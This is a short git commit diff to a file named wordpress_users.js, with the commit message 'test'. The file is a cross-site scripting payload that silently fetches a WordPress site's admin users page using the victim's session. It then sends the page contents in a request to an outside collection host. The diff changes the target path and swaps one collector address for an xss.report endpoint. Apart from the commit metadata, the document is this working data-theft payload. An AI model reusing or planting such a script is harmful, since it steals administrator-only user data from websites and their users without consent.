58c398793b8e2481abe278268006db03a103598a
gandhi3 <81832437@qq.com>
2023-07-11 22:39:43 +0800

    test

--- wordpress_users.js
+++ wordpress_users.js
@@ -1,8 +1,8 @@
 var req = new XMLHttpRequest();
 
-req.open("GET", "/v3/wp-admin/users.php", false);
+req.open("GET", "/wp-admin/users.php", false);
 req.send();
 var res = req.responseText;
 
-req.open("GET", "https://kplxg4.ez.pe?res"+res, false);
+req.open("GET", "https://xss.report/s/gandhi3?res"+res, false);
 req.send();
